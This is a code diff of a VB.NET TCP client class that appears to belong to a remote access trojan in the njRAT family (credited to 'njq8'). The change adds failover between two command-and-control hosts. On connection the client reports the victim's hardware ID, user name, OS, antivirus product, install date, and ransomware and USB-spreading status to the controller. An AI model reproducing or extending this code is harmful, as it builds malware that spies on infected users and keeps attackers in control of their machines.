@@ -1,10 +1,9 @@
-﻿Imports System.Threading
-
-Public Class TCP
+﻿Public Class TCP
     'credit to njq8
     Public Shared SPL As String = "|'N'|"
     Public Shared KEY As String = "|'L'|"
     Public Shared C As Net.Sockets.TcpClient
+    Public Shared MainHOST As String = Settings.HOST1
 
     Public Shared Sub CON()
         Dim t As New Threading.Thread(AddressOf RC)
@@ -48,7 +47,7 @@ re:
 rr:
                 If BS(M.ToArray).Contains(SPL) Then ' split packet..
                     Dim A As Array = fx(M.ToArray, SPL)
-                    Dim T As New Thread(AddressOf Main.Data)
+                    Dim T As New Threading.Thread(AddressOf Main.Data)
                     T.Start(A(0))
                     M.Dispose()
                     M = New IO.MemoryStream
@@ -83,10 +82,15 @@ e:      ' clear things and ReConnect
             C.Client.SendBufferSize = 999999
             C.Client.ReceiveBufferSize = 999999
             lp = 0
-            C.Client.Connect(Settings.HOST, Settings.PORT)
+            C.Client.Connect(MainHOST, Settings.PORT)
             CN = True
-            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.1D" & KEY & ID.MyOS & " " & ID.Bit & KEY & ID.INDATE & KEY & ID.AV & KEY & ID.Ransomeware & KEY & ID.USBSP & KEY & " ")
+            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.1E" & KEY & ID.MyOS & " " & ID.Bit & KEY & ID.INDATE & KEY & ID.AV & KEY & ID.Ransomeware & KEY & ID.USBSP & KEY & " ")
         Catch ex As Exception
+            If MainHOST = Settings.HOST1 Then
+                MainHOST = Settings.HOST2
+            Else
+                MainHOST = Settings.HOST1
+            End If
             Threading.Thread.CurrentThread.Sleep(2500)
             GoTo e
         End Try
